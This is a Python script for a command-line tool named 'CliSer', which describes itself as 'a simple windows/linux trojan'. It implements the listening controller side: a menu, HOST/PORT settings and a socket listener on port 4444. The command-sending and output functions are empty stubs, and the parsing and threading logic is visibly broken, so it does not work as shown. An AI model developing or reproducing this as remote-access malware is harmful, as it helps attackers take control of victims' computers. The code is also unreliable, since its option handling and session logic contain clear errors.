import socket
import sys
import os
from threading import Thread
from sm.sm import point_animation
from sm.sm import colors


def help_options():
    print(
"""
CLIent-SERver (CliSer®)    Developed by Kn0rX    version = 4.0    Python-version = 3.9	(C) 2019
""" + colors.RED + """
Only use this script for good purpose! Do not use it for illegal activitis!
I assume no responsibility for any damage caused by an attack of this script!
It's on you to use this script right and at your own risk!
""" + colors.CYAN + """
--Help Menu--
       
SERVER              HOST-adress to listen on it
PORT                port to listen on it

Defaults:
default from HOST = None
default from PORT = 4444

Example:
set HOST 127.0.0.1
set PORT 4444
run

Please report bugs to of----16@gmail.com""")


class server:
    def get_connection(self):
        print(colors.BLUE + "[*]  Starting listener on HOST", HOST, "and PORT", str(PORT))
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.connection.bind((HOST, int(PORT)))
        except:
            print(colors.RED + "Could not bind server on " + HOST, PORT)
    def send_command(self, command):
        pass
    def get_output(self):
        pass


server_instance = server()


def connection_handler():
    while True:
        try:
            connection = server_instance.connection
            connection.listen(1)
            client_socket, address = connection.accept()
            print(colors.BLUE + "[+]  Connection from ", address, "has been established!")
            cCommand = input(cSession_Text)
        except:
            try:
                print(colors.RED + "[-]  session " + str(nSession) + " died. Reason: lost server_socket.")
                server_instance.get_connection()
            except KeyboardInterrupt:
                break


aList_Commands = ["exit", "cls", "clear", "help", "show options", "HOST", "PORT", "run"]
aList_Set_Commands = ["SERVER", "PORT"]
active_sessions = ""
aList_OS = ["windows", "linux"]
cClear_Command = ""
HOST = None
PORT = 4444
nSession = 0
cSession_Text = "session" + str(nSession) + ": "



while True:
    cOS_Info = input("What OS do you use? (e.g: windows or linux): ")
    if cOS_Info == "windows":
        cClear_Command = "cls"
        break
    if cOS_Info == "linux":
        cClear_Command = "clear"
        break
    if not cOS_Info in aList_OS:
        print("Wrong input of OS!")

print("This is the 'CLIentSERver'-programm, a simple windows/linux trojan.")
point_animation(6)
print("\n")

while True:
    nSession += 1
    cUser_Input = input("CliSer-command: ")
    if cUser_Input in aList_Commands:
        if cUser_Input == "help" or cUser_Input == "show options":
            help_options()
            continue
        if cUser_Input == "exit":
            sys.exit("Goodbey!")
        if cUser_Input == "cls" or cUser_Input == "clear":
            os.system(cClear_Command)
            continue
        if cUser_Input == "sessions":
            print(
"""
Active sessions:
|---------------
|""" + cSession_Text + """
|

""")
        if "set" in cUser_Input.split():
            cUser_Input.split()
            if cUser_Input[1] in aList_Set_Commands:
                if cUser_Input[1] == "HOST":
                    HOST = cUser_Input[2]
                    print("-> SET HOST = " + HOST)
                    continue
                if cUser_Input[1] == "PORT":
                    HOST = cUser_Input[2]
                    print("-> SET PORT = " + str(PORT))
                    continue
        if cUser_Input == "run":
            if HOST is not None:
                t_connection = Thread(target=connection_handler)
                t_connection.join()






    else:
        print("[-]  Command not found!")
